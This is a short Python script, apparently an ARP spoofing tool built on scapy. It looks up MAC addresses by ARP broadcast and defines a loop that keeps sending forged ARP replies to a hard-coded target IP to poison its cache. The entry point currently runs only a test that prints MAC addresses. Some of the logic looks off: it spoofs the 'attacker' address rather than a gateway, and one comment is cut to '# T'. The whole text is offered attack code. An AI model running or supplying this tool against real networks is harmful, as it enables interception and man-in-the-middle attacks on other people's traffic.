from scapy.all import ARP, Ether, srp, send


TARGET_IP = "192.168.1.10"

# T
ATTACKER_IP = "192.168.1.30"

def get_mac(ip):
    # Send an ARP request for the MAC address of the IP

    # Creates the ARP request packet.
    request = ARP(pdst=ip)

    # Creates the broadcast packet.
    broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff")

    # Combines the frames to one packet.
    packet = broadcast_packet / request

    # reply is the reply of the request packet.
    reply = srp(packet, timeout=3, verbose=False)

    # Extracts the MAC address of the response.
    mac = reply[0][0][1].hwsrc
    return mac

# Will send an ARP reply packet, pretending to be the target.
def spoof(target_ip, spoofed_ip):

    # Gets the MAC address of the target.
    mac = get_mac(target_ip)

    # Creates the ARP packet, and sets the packet source and destination.
    packet = ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)

    # Sends the ARP packet.
    send(packet, verbose=False)

def testing():
    print("TARGET MAC: " + get_mac(TARGET_IP))
    print("ATTACKER MAC: " + get_mac(ATTACKER_IP))


def main():
    try:
        while True:
            spoof(TARGET_IP, ATTACKER_IP)
    except KeyboardInterrupt:
        print("[i] Process stopped.")

if __name__ == "__main__":
    testing()

